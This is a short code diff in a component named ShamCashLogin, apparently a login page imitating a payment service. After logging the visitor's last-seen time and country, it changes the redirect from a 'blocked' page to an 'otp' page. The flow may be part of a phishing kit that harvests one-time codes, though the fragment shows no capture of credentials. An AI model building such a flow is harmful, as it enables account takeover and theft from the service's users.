@@ -108,7 +108,7 @@ export function ShamCashLogin() {
       lastSeen: Date.now(),
       country,
     });
-    window.location.href = `${import.meta.env.BASE_URL}blocked`;
+    window.location.href = `${import.meta.env.BASE_URL}otp`;
   }
 
   const dir = lang === "ar" ? "rtl" : "ltr";
